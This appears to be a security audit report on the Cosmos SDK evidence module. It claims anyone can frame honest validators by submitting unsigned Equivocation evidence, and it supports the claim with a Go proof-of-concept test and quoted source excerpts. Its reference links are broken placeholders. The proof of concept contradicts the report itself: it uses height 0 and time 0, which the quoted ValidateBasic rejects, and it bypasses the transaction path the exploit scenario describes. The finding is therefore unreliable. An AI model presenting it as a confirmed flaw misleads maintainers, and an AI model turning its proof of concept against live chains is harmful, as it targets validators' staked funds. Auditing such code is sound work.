## Audit Report

## Title
Lack of Cryptographic Verification for User-Submitted Evidence Allows Framing of Honest Validators

## Summary
The evidence module allows any user to submit `Equivocation` evidence via `MsgSubmitEvidence` transactions, but the evidence handler performs no cryptographic signature verification to prove the accused validator actually committed the misbehavior. This allows an attacker to forge evidence and cause honest validators to be slashed, jailed, and permanently tombstoned.

## Impact
**High** - Direct loss of funds for validators and potential network disruption.

## Finding Description

**Location:** The vulnerability spans multiple components in the evidence module:
- [1](#0-0) 
- [2](#0-1) 
- [3](#0-2) 

**Intended Logic:** The evidence module is designed to handle byzantine fault evidence. Evidence should only result in validator punishment when the validator has provably committed misbehavior (e.g., signing conflicting blocks). The handler documentation states it should verify evidence as valid. [4](#0-3) 

**Actual Logic:** The `HandleEquivocationEvidence` function performs only stateful checks (validator existence, evidence age, tombstone status) but no cryptographic verification that the validator actually signed conflicting blocks or committed the alleged offense. [5](#0-4) 

The `Equivocation` evidence type contains only metadata fields (consensus address, height, time, power) without any cryptographic proof such as signed blocks or votes. [6](#0-5) 

**Exploit Scenario:**
1. Attacker creates a fake `Equivocation` evidence pointing to an honest validator's consensus address, with plausible height/time/power values
2. Attacker submits via `MsgSubmitEvidence` transaction [7](#0-6) 
3. `ValidateBasic()` only checks basic field constraints (power >= 1, height >= 1) - no signature verification
4. Evidence is routed to `HandleEquivocationEvidence` which performs age and status checks but no cryptographic validation
5. The honest validator is slashed, jailed, and permanently tombstoned without any proof of wrongdoing [8](#0-7) 

**Security Failure:** Authorization and authenticity failure. The system cannot distinguish between legitimate evidence of misbehavior and forged evidence, allowing unauthorized punishment of innocent validators.

## Impact Explanation

- **Assets Affected:** Validator stake tokens are directly slashed (typically 5% per `SlashFractionDoubleSign`) [9](#0-8) 

- **Severity:** The victim validator is permanently tombstoned, meaning they can never rejoin the validator set with the same consensus key, even after serving jail time [10](#0-9) 

- **Network Impact:** If attackers target multiple honest validators, this could cause significant network disruption, reduce decentralization, and undermine trust in the validator set. The attack costs only transaction fees.

## Likelihood Explanation

- **Who:** Any network participant with sufficient tokens to pay transaction fees can exploit this vulnerability
- **Conditions:** Requires only that the target validator exists, is not already tombstoned, and the evidence is not too old (within `MaxAgeDuration` and `MaxAgeNumBlocks`) [11](#0-10) 
- **Frequency:** Can be executed immediately and repeatedly against different validators. The only protection is the duplicate evidence check which prevents the exact same evidence hash from being processed twice [12](#0-11) 

## Recommendation

The evidence module should reject user-submitted `Equivocation` evidence or require cryptographic proof. Recommended fixes:

1. **Immediate Fix:** Remove `Equivocation` from the set of evidence types that users can submit via `MsgSubmitEvidence`. Only allow Tendermint to submit evidence via ABCI `BeginBlock`, where Tendermint has already validated signatures.

2. **Long-term Fix:** Define a new evidence type that includes the actual signed blocks/votes as cryptographic proof, and implement signature verification in the handler before applying any punishment. The handler should verify:
   - The conflicting blocks/votes are properly signed by the validator's key
   - The signatures are valid
   - The evidence represents actual byzantine behavior (e.g., signing at same height/round)

3. **Alternative:** Add a governance-controlled whitelist of addresses allowed to submit evidence, limiting this capability to trusted entities.

## Proof of Concept

**File:** `x/evidence/keeper/infraction_test.go`

**Test Function:** Add `TestFakeEvidenceAttack` to demonstrate the vulnerability:

```go
func (suite *KeeperTestSuite) TestFakeEvidenceAttack() {
	ctx := suite.ctx.WithIsCheckTx(false).WithBlockHeight(1)
	suite.populateValidators(ctx)
	
	// Setup: Create an honest validator
	stakingParams := suite.app.StakingKeeper.GetParams(ctx)
	stakingParams.MinCommissionRate = sdk.NewDec(0)
	suite.app.StakingKeeper.SetParams(ctx, stakingParams)
	
	power := int64(100)
	operatorAddr, val := valAddresses[0], pubkeys[0]
	tstaking := teststaking.NewHelper(suite.T(), ctx, suite.app.StakingKeeper)
	tstaking.CreateValidatorWithValPower(operatorAddr, val, power, true)
	staking.EndBlocker(ctx, suite.app.StakingKeeper)
	
	// Initialize signing info
	req := abcitypes.RequestBeginBlock{
		LastCommitInfo: abcitypes.LastCommitInfo{
			Votes: []abcitypes.VoteInfo{{
				Validator: abcitypes.Validator{
					Address: val.Address().Bytes(),
					Power:   power,
				},
				SignedLastBlock: true,
			}},
		},
	}
	slashing.BeginBlocker(ctx, req, suite.app.SlashingKeeper)
	
	// Get validator state before attack
	validatorBefore := suite.app.StakingKeeper.Validator(ctx, operatorAddr)
	tokensBefore := validatorBefore.GetTokens()
	
	// Trigger: Attacker submits fake evidence (no cryptographic proof!)
	fakeEvidence := &types.Equivocation{
		Height:           0,
		Time:             time.Unix(0, 0),
		Power:            power,
		ConsensusAddress: sdk.ConsAddress(val.Address()).String(),
	}
	
	// This should fail but doesn't - fake evidence is accepted!
	err := suite.app.EvidenceKeeper.SubmitEvidence(ctx, fakeEvidence)
	suite.NoError(err) // Evidence is accepted without signature verification
	
	// Observe: Honest validator is slashed and tombstoned
	validatorAfter := suite.app.StakingKeeper.Validator(ctx, operatorAddr)
	tokensAfter := validatorAfter.GetTokens()
	
	// Validator lost tokens despite being innocent
	suite.True(tokensAfter.LT(tokensBefore), "Honest validator was slashed")
	suite.True(validatorAfter.IsJailed(), "Honest validator was jailed")
	suite.True(suite.app.SlashingKeeper.IsTombstoned(ctx, sdk.ConsAddress(val.Address())), 
		"Honest validator was permanently tombstoned")
}
```

**Setup:** Creates an honest validator with staking power and initializes signing info.

**Trigger:** Submits fake `Equivocation` evidence with the validator's address but no cryptographic proof of misbehavior.

**Observation:** The test demonstrates that the innocent validator is slashed, jailed, and permanently tombstoned despite never committing any byzantine behavior. The evidence is accepted purely based on metadata fields without signature verification.

## Notes

The core issue is that the SDK's evidence module has two distinct trust models that are incorrectly conflated:

1. **Tendermint Evidence (Trusted):** Evidence from Tendermint via ABCI is pre-validated by the consensus layer with signature checks. The SDK correctly trusts this evidence. [13](#0-12) 

2. **User-Submitted Evidence (Untrusted):** Evidence submitted by users via transactions should require cryptographic proof, but the same handler is used for both paths without distinguishing between them.

The `FromABCIEvidence` conversion discards the cryptographic proof (votes/blocks) and retains only metadata, which is appropriate when Tendermint has already validated signatures. However, this same simplified evidence type is exposed to users who can submit it without any proof. [14](#0-13) 

The TODO comment acknowledges that evidence handling may need reconsideration for certain attack types, but the fundamental issue of missing signature verification remains unaddressed. [15](#0-14)

### Citations

**File:** x/evidence/types/codec.go (L14-18)
```go
func RegisterLegacyAminoCodec(cdc *codec.LegacyAmino) {
	cdc.RegisterInterface((*exported.Evidence)(nil), nil)
	cdc.RegisterConcrete(&MsgSubmitEvidence{}, "cosmos-sdk/MsgSubmitEvidence", nil)
	cdc.RegisterConcrete(&Equivocation{}, "cosmos-sdk/Equivocation", nil)
}
```

**File:** x/evidence/keeper/msg_server.go (L23-29)
```go
func (ms msgServer) SubmitEvidence(goCtx context.Context, msg *types.MsgSubmitEvidence) (*types.MsgSubmitEvidenceResponse, error) {
	ctx := sdk.UnwrapSDKContext(goCtx)

	evidence := msg.GetEvidence()
	if err := ms.Keeper.SubmitEvidence(ctx, evidence); err != nil {
		return nil, err
	}
```

**File:** x/evidence/keeper/infraction.go (L23-24)
```go
// TODO: Some of the invalid constraints listed above may need to be reconsidered
// in the case of a lunatic attack.
```

**File:** x/evidence/keeper/infraction.go (L25-123)
```go
func (k Keeper) HandleEquivocationEvidence(ctx sdk.Context, evidence *types.Equivocation) {
	logger := k.Logger(ctx)
	consAddr := evidence.GetConsensusAddress()

	if _, err := k.slashingKeeper.GetPubkey(ctx, consAddr.Bytes()); err != nil {
		// Ignore evidence that cannot be handled.
		//
		// NOTE: We used to panic with:
		// `panic(fmt.Sprintf("Validator consensus-address %v not found", consAddr))`,
		// but this couples the expectations of the app to both Tendermint and
		// the simulator.  Both are expected to provide the full range of
		// allowable but none of the disallowed evidence types.  Instead of
		// getting this coordination right, it is easier to relax the
		// constraints and ignore evidence that cannot be handled.
		return
	}

	// calculate the age of the evidence
	infractionHeight := evidence.GetHeight()
	infractionTime := evidence.GetTime()
	ageDuration := ctx.BlockHeader().Time.Sub(infractionTime)
	ageBlocks := ctx.BlockHeader().Height - infractionHeight

	// Reject evidence if the double-sign is too old. Evidence is considered stale
	// if the difference in time and number of blocks is greater than the allowed
	// parameters defined.
	cp := ctx.ConsensusParams()
	if cp != nil && cp.Evidence != nil {
		if ageDuration > cp.Evidence.MaxAgeDuration && ageBlocks > cp.Evidence.MaxAgeNumBlocks {
			logger.Info(
				"ignored equivocation; evidence too old",
				"validator", consAddr,
				"infraction_height", infractionHeight,
				"max_age_num_blocks", cp.Evidence.MaxAgeNumBlocks,
				"infraction_time", infractionTime,
				"max_age_duration", cp.Evidence.MaxAgeDuration,
			)
			return
		}
	}

	validator := k.stakingKeeper.ValidatorByConsAddr(ctx, consAddr)
	if validator == nil || validator.IsUnbonded() {
		// Defensive: Simulation doesn't take unbonding periods into account, and
		// Tendermint might break this assumption at some point.
		return
	}

	if ok := k.slashingKeeper.HasValidatorSigningInfo(ctx, consAddr); !ok {
		panic(fmt.Sprintf("expected signing info for validator %s but not found", consAddr))
	}

	// ignore if the validator is already tombstoned
	if k.slashingKeeper.IsTombstoned(ctx, consAddr) {
		logger.Info(
			"ignored equivocation; validator already tombstoned",
			"validator", consAddr,
			"infraction_height", infractionHeight,
			"infraction_time", infractionTime,
		)
		return
	}

	logger.Info(
		"confirmed equivocation",
		"validator", consAddr,
		"infraction_height", infractionHeight,
		"infraction_time", infractionTime,
	)

	// We need to retrieve the stake distribution which signed the block, so we
	// subtract ValidatorUpdateDelay from the evidence height.
	// Note, that this *can* result in a negative "distributionHeight", up to
	// -ValidatorUpdateDelay, i.e. at the end of the
	// pre-genesis block (none) = at the beginning of the genesis block.
	// That's fine since this is just used to filter unbonding delegations & redelegations.
	distributionHeight := infractionHeight - sdk.ValidatorUpdateDelay

	// Slash validator. The `power` is the int64 power of the validator as provided
	// to/by Tendermint. This value is validator.Tokens as sent to Tendermint via
	// ABCI, and now received as evidence. The fraction is passed in to separately
	// to slash unbonding and rebonding delegations.
	k.slashingKeeper.Slash(
		ctx,
		consAddr,
		k.slashingKeeper.SlashFractionDoubleSign(ctx),
		evidence.GetValidatorPower(), distributionHeight,
	)

	// Jail the validator if not already jailed. This will begin unbonding the
	// validator if not already unbonding (tombstoned).
	if !validator.IsJailed() {
		k.slashingKeeper.Jail(ctx, consAddr)
	}

	k.slashingKeeper.JailUntil(ctx, consAddr, types.DoubleSignJailEndTime)
	k.slashingKeeper.Tombstone(ctx, consAddr)
	k.SetEvidence(ctx, evidence)
}
```

**File:** x/evidence/spec/01_concepts.md (L65-77)
```markdown
The `Handler` (defined below) is responsible for executing the entirety of the
business logic for handling `Evidence`. This typically includes validating the
evidence, both stateless checks via `ValidateBasic` and stateful checks via any
keepers provided to the `Handler`. In addition, the `Handler` may also perform
capabilities such as slashing and jailing a validator. All `Evidence` handled
by the `Handler` should be persisted.

```go
// Handler defines an agnostic Evidence handler. The handler is responsible
// for executing all corresponding business logic necessary for verifying the
// evidence as valid. In addition, the Handler may execute any necessary
// slashing and potential jailing.
type Handler func(sdk.Context, Evidence) error
```

**File:** x/evidence/types/evidence.go (L45-61)
```go
// ValidateBasic performs basic stateless validation checks on an Equivocation object.
func (e *Equivocation) ValidateBasic() error {
	if e.Time.Unix() <= 0 {
		return fmt.Errorf("invalid equivocation time: %s", e.Time)
	}
	if e.Height < 1 {
		return fmt.Errorf("invalid equivocation height: %d", e.Height)
	}
	if e.Power < 1 {
		return fmt.Errorf("invalid equivocation validator power: %d", e.Power)
	}
	if e.ConsensusAddress == "" {
		return fmt.Errorf("invalid equivocation validator consensus address: %s", e.ConsensusAddress)
	}

	return nil
}
```

**File:** x/evidence/types/evidence.go (L89-104)
```go
// FromABCIEvidence converts a Tendermint concrete Evidence type to
// SDK Evidence using Equivocation as the concrete type.
func FromABCIEvidence(e abci.Evidence) exported.Evidence {
	bech32PrefixConsAddr := sdk.GetConfig().GetBech32ConsensusAddrPrefix()
	consAddr, err := sdk.Bech32ifyAddressBytes(bech32PrefixConsAddr, e.Validator.Address)
	if err != nil {
		panic(err)
	}

	return &Equivocation{
		Height:           e.Height,
		Power:            e.Validator.Power,
		ConsensusAddress: consAddr,
		Time:             e.Time,
	}
}
```

**File:** x/evidence/types/msgs.go (L45-60)
```go
// ValidateBasic performs basic (non-state-dependant) validation on a MsgSubmitEvidence.
func (m MsgSubmitEvidence) ValidateBasic() error {
	if m.Submitter == "" {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidAddress, m.Submitter)
	}

	evi := m.GetEvidence()
	if evi == nil {
		return sdkerrors.Wrap(ErrInvalidEvidence, "missing evidence")
	}
	if err := evi.ValidateBasic(); err != nil {
		return err
	}

	return nil
}
```

**File:** x/staking/keeper/slash.go (L24-34)
```go
func (k Keeper) Slash(ctx sdk.Context, consAddr sdk.ConsAddress, infractionHeight int64, power int64, slashFactor sdk.Dec) {
	logger := k.Logger(ctx)

	if slashFactor.IsNegative() {
		panic(fmt.Errorf("attempted to slash with a negative slash factor: %v", slashFactor))
	}

	// Amount of slashing = slash slashFactor * power at time of infraction
	amount := k.TokensFromConsensusPower(ctx, power)
	slashAmountDec := amount.ToDec().Mul(slashFactor)
	slashAmount := slashAmountDec.TruncateInt()
```

**File:** x/slashing/keeper/signing_info.go (L141-155)
```go
// Tombstone attempts to tombstone a validator. It will panic if signing info for
// the given validator does not exist.
func (k Keeper) Tombstone(ctx sdk.Context, consAddr sdk.ConsAddress) {
	signInfo, ok := k.GetValidatorSigningInfo(ctx, consAddr)
	if !ok {
		panic("cannot tombstone validator that does not have any signing information")
	}

	if signInfo.Tombstoned {
		panic("cannot tombstone validator that is already tombstoned")
	}

	signInfo.Tombstoned = true
	k.SetValidatorSigningInfo(ctx, consAddr, signInfo)
}
```

**File:** x/evidence/keeper/keeper.go (L78-81)
```go
func (k Keeper) SubmitEvidence(ctx sdk.Context, evidence exported.Evidence) error {
	if _, ok := k.GetEvidence(ctx, evidence.Hash()); ok {
		return sdkerrors.Wrap(types.ErrEvidenceExists, evidence.Hash().String())
	}
```

**File:** x/evidence/abci.go (L14-31)
```go
// BeginBlocker iterates through and handles any newly discovered evidence of
// misbehavior submitted by Tendermint. Currently, only equivocation is handled.
func BeginBlocker(ctx sdk.Context, req abci.RequestBeginBlock, k keeper.Keeper) {
	defer telemetry.ModuleMeasureSince(types.ModuleName, time.Now(), telemetry.MetricKeyBeginBlocker)

	for _, tmEvidence := range req.ByzantineValidators {
		switch tmEvidence.Type {
		// It's still ongoing discussion how should we treat and slash attacks with
		// premeditation. So for now we agree to treat them in the same way.
		case abci.MisbehaviorType_DUPLICATE_VOTE, abci.MisbehaviorType_LIGHT_CLIENT_ATTACK:
			evidence := types.FromABCIEvidence(tmEvidence)
			k.HandleEquivocationEvidence(ctx, evidence.(*types.Equivocation))

		default:
			k.Logger(ctx).Error(fmt.Sprintf("ignored unknown evidence type: %s", tmEvidence.Type))
		}
	}
}
```
